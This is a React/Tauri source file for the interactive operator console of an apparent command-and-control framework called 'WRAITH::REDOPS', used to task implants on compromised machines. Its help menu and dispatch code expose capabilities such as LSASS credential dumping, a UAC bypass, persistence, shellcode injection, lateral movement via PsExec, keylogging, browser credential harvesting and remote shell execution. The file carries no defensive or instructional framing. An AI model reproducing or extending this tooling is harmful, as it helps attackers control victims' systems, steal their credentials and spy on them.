import { useEffect, useRef, useCallback } from 'react';
import { Terminal } from 'xterm';
import { FitAddon } from 'xterm-addon-fit';
import 'xterm/css/xterm.css';
import { invoke } from '@tauri-apps/api/core';
import * as ipc from '../lib/ipc';
import { useToastStore } from '../stores/toastStore';

interface ConsoleProps {
  implantId: string;
}

export const Console = ({ implantId }: ConsoleProps) => {
  const terminalRef = useRef<HTMLDivElement>(null);
  const xtermRef = useRef<Terminal | null>(null);
  const commandHistoryRef = useRef<string[]>([]);
  const historyIndexRef = useRef<number>(-1);
  const currentCommandRef = useRef<string>('');
  const lastCommandIdRef = useRef<string | null>(null);
  const addToast = useToastStore((s) => s.addToast);

  const handleClear = useCallback(() => {
    if (xtermRef.current) {
      xtermRef.current.clear();
    }
  }, []);

  const handleHistory = useCallback(() => {
    if (!xtermRef.current) return;
    const terminal = xtermRef.current;
    const history = commandHistoryRef.current;
    if (history.length === 0) {
      terminal.writeln('\r\n\x1b[33mCommand history is empty.\x1b[0m');
    } else {
      terminal.writeln('\r\n\x1b[33mCommand History:\x1b[0m');
      history.forEach((cmd, i) => {
        terminal.writeln(`  ${i + 1}. ${cmd}`);
      });
    }
    terminal.write('$ ');
  }, []);

  const handleCancelLast = useCallback(async () => {
    if (!lastCommandIdRef.current) {
      addToast('warning', 'No running command to cancel');
      return;
    }
    try {
      await ipc.cancelCommand(lastCommandIdRef.current);
      addToast('info', 'Cancel request sent');
    } catch (e) {
      addToast('error', 'Cancel failed: ' + e);
    }
  }, [addToast]);

  const clearLine = useCallback((terminal: Terminal, command: string) => {
    for (let i = 0; i < command.length; i++) {
      terminal.write('\b \b');
    }
  }, []);

  useEffect(() => {
    if (!terminalRef.current) return;

    const terminal = new Terminal({
      theme: {
        background: '#0f172a',
        foreground: '#cbd5e1',
        cursor: '#ef4444',
        selectionBackground: '#334155',
      },
      fontFamily: 'JetBrains Mono, monospace',
      fontSize: 13,
      cursorBlink: true,
      scrollback: 1000,
    });

    const fitAddon = new FitAddon();
    terminal.loadAddon(fitAddon);
    terminal.open(terminalRef.current);
    fitAddon.fit();

    const handleResize = () => fitAddon.fit();
    window.addEventListener('resize', handleResize);

    terminal.writeln(`\x1b[1;31mWRAITH::REDOPS\x1b[0m Interactive Console`);
    terminal.writeln(`Attached to beacon: \x1b[33m${implantId}\x1b[0m`);
    terminal.writeln(`\x1b[90mType 'help' for available commands. Ctrl+X to cancel last command.\x1b[0m`);
    terminal.write('\r\n$ ');

    let command = '';

    terminal.onData(async (data) => {
      if (data === '\x1b[A') { // Up arrow
        if (commandHistoryRef.current.length > 0) {
          if (historyIndexRef.current === -1) {
            currentCommandRef.current = command;
            historyIndexRef.current = commandHistoryRef.current.length - 1;
          } else if (historyIndexRef.current > 0) {
            historyIndexRef.current--;
          }
          clearLine(terminal, command);
          command = commandHistoryRef.current[historyIndexRef.current];
          terminal.write(command);
        }
        return;
      }

      if (data === '\x1b[B') { // Down arrow
        if (historyIndexRef.current !== -1) {
          clearLine(terminal, command);
          if (historyIndexRef.current < commandHistoryRef.current.length - 1) {
            historyIndexRef.current++;
            command = commandHistoryRef.current[historyIndexRef.current];
          } else {
            historyIndexRef.current = -1;
            command = currentCommandRef.current;
          }
          terminal.write(command);
        }
        return;
      }

      if (data === '\r') {
        terminal.write('\r\n');
        if (command.trim()) {
          const trimmed = command.trim();
          const lastCmd = commandHistoryRef.current[commandHistoryRef.current.length - 1];
          if (trimmed !== lastCmd) {
            commandHistoryRef.current.push(trimmed);
            if (commandHistoryRef.current.length > 100) commandHistoryRef.current.shift();
          }

          if (trimmed === 'help') {
            terminal.writeln('\x1b[33mCommands:\x1b[0m');
            terminal.writeln('  shell <cmd>      - Execute cmd via sh/cmd.exe');
            terminal.writeln('  powershell <cmd> - Execute unmanaged PowerShell');
            terminal.writeln('  persist <method> <name> <path> - Install persistence (registry/task)');
            terminal.writeln('  lsass            - Dump LSASS memory');
            terminal.writeln('  uac <cmd>        - Fodhelper UAC bypass');
            terminal.writeln('  timestomp <tgt> <src> - Copy timestamps');
            terminal.writeln('  sandbox          - Check if in sandbox');
            terminal.writeln('  recon            - System Info');
            terminal.writeln('  lateral <tgt> <svc> <bin> - PsExec via service');
            terminal.writeln('  keylog           - Poll keylogger');
            terminal.writeln('  kill             - Terminate implant');
            terminal.writeln('  setprofile <script> - Set PowerShell profile');
            terminal.writeln('  getprofile       - Get PowerShell profile');
            terminal.writeln('  inject <pid> <method> <hex> - Inject shellcode');
            terminal.writeln('  bof <hex>        - Execute COFF/BOF');
            terminal.writeln('  socks <hex>      - SOCKS proxy data');
            terminal.writeln('  screenshot       - Capture screenshot');
            terminal.writeln('  browser          - Harvest browser creds');
            terminal.writeln('  netscan <target> - Network scan');
            terminal.writeln('  stopsvc <name>   - Stop service');
            terminal.writeln('  cancel           - Cancel last running command');
          } else if (trimmed === 'cancel') {
            if (lastCommandIdRef.current) {
              try {
                await ipc.cancelCommand(lastCommandIdRef.current);
                terminal.writeln('\x1b[33mCancel request sent\x1b[0m');
              } catch (e) {
                terminal.writeln(`\x1b[31mCancel failed:\x1b[0m ${e}`);
              }
            } else {
              terminal.writeln('\x1b[33mNo running command to cancel\x1b[0m');
            }
          } else if (trimmed.startsWith('setprofile ')) {
            const script = trimmed.substring(11);
            try {
              await invoke('set_powershell_profile', { implantId, profileScript: script });
              terminal.writeln(`\x1b[32mProfile updated\x1b[0m`);
            } catch (e) {
              terminal.writeln(`\x1b[31mError:\x1b[0m ${e}`);
            }
          } else if (trimmed === 'getprofile') {
            try {
              const script = await invoke('get_powershell_profile', { implantId });
              terminal.writeln(`\x1b[32mCurrent Profile:\x1b[0m\r\n${script}`);
            } catch (e) {
              terminal.writeln(`\x1b[31mError:\x1b[0m ${e}`);
            }
          } else if (trimmed === 'clear') {
            terminal.clear();
          } else {
            const parts = trimmed.split(' ');
            const cmdName = parts[0];
            const args = parts.slice(1).join(' ');

            let type = 'shell';
            let payload = trimmed;

            switch(cmdName) {
                case 'powershell': type = 'powershell'; payload = args; break;
                case 'persist': type = 'persist'; payload = args; break;
                case 'lsass': type = 'dump_lsass'; payload = args; break;
                case 'uac': type = 'uac_bypass'; payload = args; break;
                case 'timestomp': type = 'timestomp'; payload = args; break;
                case 'sandbox': type = 'sandbox_check'; payload = ''; break;
                case 'recon': type = 'sys_info'; payload = ''; break;
                case 'lateral': type = 'psexec'; payload = args; break;
                case 'keylog': type = 'keylogger'; payload = ''; break;
                case 'kill': type = 'kill'; payload = ''; break;
                case 'shell': type = 'shell'; payload = args; break;
                case 'inject': type = 'inject'; payload = args; break;
                case 'bof': type = 'bof'; payload = args; break;
                case 'socks': type = 'socks'; payload = args; break;
                case 'screenshot': type = 'screenshot'; payload = ''; break;
                case 'browser': type = 'browser'; payload = ''; break;
                case 'netscan': type = 'net_scan'; payload = args; break;
                case 'stopsvc': type = 'service_stop'; payload = args; break;
                default:
                    type = 'shell'; payload = trimmed;
            }

            try {
              const cmdId = await invoke('send_command', {
                implantId,
                commandType: type,
                payload: payload,
              }) as string;
              lastCommandIdRef.current = cmdId;
              terminal.writeln(`\x1b[32mQueued task:\x1b[0m ${type}`);
            } catch (e) {
              terminal.writeln(`\x1b[31mError:\x1b[0m ${e}`);
            }
          }
        }
        command = '';
        historyIndexRef.current = -1;
        currentCommandRef.current = '';
        terminal.write('$ ');
      } else if (data === '\u007f') {
        if (command.length > 0) {
          command = command.slice(0, -1);
          terminal.write('\b \b');
        }
      } else if (data === '\x03') {
        terminal.write('^C\r\n$ ');
        command = '';
        historyIndexRef.current = -1;
      } else if (data === '\x18') {
        // Ctrl+X = cancel last command
        handleCancelLast();
      } else if (data.charCodeAt(0) >= 32) {
        command += data;
        terminal.write(data);
      }
    });

    xtermRef.current = terminal;

    return () => {
      window.removeEventListener('resize', handleResize);
      terminal.dispose();
    };
  }, [implantId, clearLine, handleCancelLast]);

  return (
    <div className="flex flex-col h-full overflow-hidden rounded border border-slate-800 bg-slate-900 shadow-inner">
      <div className="flex items-center justify-between px-3 py-1 bg-slate-800 text-[10px] text-slate-400 uppercase tracking-wider">
        <span className="font-bold text-red-500">Beacon Console: {implantId.substring(0, 8)}</span>
        <div className="flex gap-2">
            <button onClick={handleClear} className="cursor-pointer hover:text-white transition-colors">Clear</button>
            <button onClick={handleHistory} className="cursor-pointer hover:text-white transition-colors">History</button>
            <button onClick={handleCancelLast} className="cursor-pointer hover:text-red-400 transition-colors">Cancel</button>
        </div>
      </div>
      <div ref={terminalRef} className="flex-1 p-2 overflow-hidden" />
    </div>
  );
};
